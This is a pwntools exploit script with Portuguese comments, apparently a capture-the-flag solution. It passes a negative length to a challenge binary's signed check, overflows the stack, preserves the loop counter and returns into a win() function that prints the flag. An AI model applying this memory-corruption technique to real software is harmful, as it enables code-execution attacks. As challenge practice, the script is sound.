#!/usr/bin/env python3
from pwn import *

# Binário local do desafio
BINARIO = "./attachments/vault"

# Endereços fixos porque o binário está sem PIE
WIN = 0x401b85

# Usamos um gadget "ret" simples para alinhar a stack antes de entrar em win().
# O endereço 0x401d2d é o ret no final da função login.
RET = 0x401d2d

context.binary = BINARIO
context.arch = "amd64"
context.log_level = "info"

def montar_payload():
    # Buffer começa em rbp-0x50.
    # O contador do loop fica em rbp-0x4, offset 76 dentro do buffer.
    # Precisamos escrever 76 bytes até alcançar o contador.
    payload = b"A" * 76

    # Preserva o contador.
    # Quando o loop chega no índice 76, o contador vale 0x4c.
    # Se sobrescrevermos com outro valor, o loop pode pular posições ou travar.
    payload += b"\x4c\x00\x00\x00"

    # Depois desses 80 bytes, chegamos no saved RBP.
    payload += b"B" * 8

    # Return address.
    # Primeiro um ret para alinhamento de stack.
    # Depois pulamos para win(), que abre /flag.txt e imprime a flag.
    payload += p64(RET)
    payload += p64(WIN)

    return payload

def main():
    payload = montar_payload()

    log.info(f"Tamanho do payload: {len(payload)} bytes")
    log.info(f"win() = {hex(WIN)}")
    log.info(f"ret alinhamento = {hex(RET)}")

    io = process(BINARIO)

    # Envia tamanho negativo.
    # A validação assinada aceita -1 porque -1 <= 64.
    # Depois o loop trata esse valor como unsigned, permitindo overflow.
    io.sendlineafter(b"Password length: ", b"-1")

    # Envia o payload binário.
    io.sendlineafter(b"Password: ", payload)

    # Mostra todo o output para confirmar se caiu em win().
    resposta = io.recvall(timeout=3)
    print(resposta.decode(errors="replace"))

if __name__ == "__main__":
    main()
